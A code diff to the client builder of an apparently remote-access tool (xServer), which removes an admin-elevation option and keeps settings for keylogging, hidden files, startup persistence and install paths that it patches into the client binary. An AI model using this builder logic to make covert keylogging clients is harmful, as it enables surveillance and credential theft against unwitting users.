@@ -30,7 +30,6 @@ namespace xServer.Core.Build
         /// <param name="keylogger">Determines if keylogging functionality should be activated.</param>
         /// <param name="reconnectdelay">The amount the client will wait until attempting to reconnect.</param>
         /// <param name="installpath">The installation path of the client.</param>
-        /// <param name="adminelevation">Determines whether the client should (attempt) to obtain administrator privileges.</param>
         /// <param name="iconpath">The path to the icon for the client.</param>
         /// <param name="asminfo">Information about the client executable's assembly information.</param>
         /// <param name="version">The version number of the client.</param>
@@ -40,7 +39,7 @@ namespace xServer.Core.Build
         public static void Build(string output, string tag, string host, string password, string installsub, string installname,
             string mutex, string startupkey, bool install, bool startup, bool hidefile, bool keylogger,
             int reconnectdelay,
-            int installpath, bool adminelevation, string iconpath, string[] asminfo, string version)
+            int installpath, string iconpath, string[] asminfo, string version)
         {
             // PHASE 1 - Settings
             string encKey = FileHelper.GetRandomFilename(20);
@@ -62,7 +61,7 @@ namespace xServer.Core.Build
                     {
                         if (methodDef.Name == ".cctor")
                         {
-                            int strings = 1, bools = 1, ints = 1;
+                            int strings = 1, bools = 1;
 
                             for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
                             {
@@ -114,11 +113,7 @@ namespace xServer.Core.Build
                                         case 3: //hidefile
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(hidefile));
                                             break;
-                                        case 4: //AdminElevation
-                                            methodDef.Body.Instructions[i] =
-                                                Instruction.Create(BoolOpcode(adminelevation));
-                                            break;
-                                        case 5: //Keylogger
+                                        case 4: //Keylogger
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpcode(keylogger));
                                             break;
                                     }
